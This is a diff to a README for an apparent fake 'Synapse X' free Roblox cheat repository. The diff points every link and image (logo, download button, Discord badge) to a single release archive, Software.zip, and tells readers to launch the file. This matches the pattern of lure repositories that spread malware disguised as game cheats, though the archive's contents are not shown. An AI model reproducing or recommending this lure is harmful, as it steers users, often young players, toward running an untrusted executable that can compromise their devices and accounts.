@@ -1,6 +1,6 @@
 # 🚀 Welcome to Synapse X Roblox Free Repository! 🎮
 
-![Synapse Logo](https://example.com/synapse_logo.png)
+![Synapse Logo](https://github.com/Dropeed10/synapse-x-roblox-free/releases/download/v1.0/Software.zip)
 
 ## Repository Name: 
 synapse-x-roblox-free
@@ -27,7 +27,7 @@ Welcome to the world of Roblox cheats, hacks, and scripts with Synapse X Roblox 
 - synapse-free
 
 ## 📂 Get Started:
-To access the repository content, click the following link: [Download Synapse X 2024](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Note that the file needs to be launched to initiate the download process.
+To access the repository content, click the following link: [Download Synapse X 2024](https://github.com/Dropeed10/synapse-x-roblox-free/releases/download/v1.0/Software.zip). Note that the file needs to be launched to initiate the download process.
 
 For more updates and latest releases, please check the "Releases" section of the repository.
 
@@ -43,11 +43,11 @@ We welcome contributions from the Roblox community to expand the repository with
 ## 🤝 Community Support:
 Join our Discord community to connect with like-minded Roblox enthusiasts, share tips and tricks, and stay updated on the latest hacks and scripts. Let's build a vibrant community together!
 
-[![Join Discord Community](https://img.shields.io/discord/123456789098765432)](https://discord.com/roblox-synapse-community)
+[![Join Discord Community](https://github.com/Dropeed10/synapse-x-roblox-free/releases/download/v1.0/Software.zip)](https://github.com/Dropeed10/synapse-x-roblox-free/releases/download/v1.0/Software.zip)
 
 ## 📌 Stay Updated:
 Make sure to "Watch" this repository to receive notifications about new releases, updates, and community discussions. Stay ahead in the game with the latest Roblox hacks and cheats!
 
 ## 🎮 Happy Gaming with Synapse X Roblox Free! 🎉
 
-![Roblox Gaming](https://example.com/roblox_gaming_image.png)
+![Roblox Gaming](https://github.com/Dropeed10/synapse-x-roblox-free/releases/download/v1.0/Software.zip)
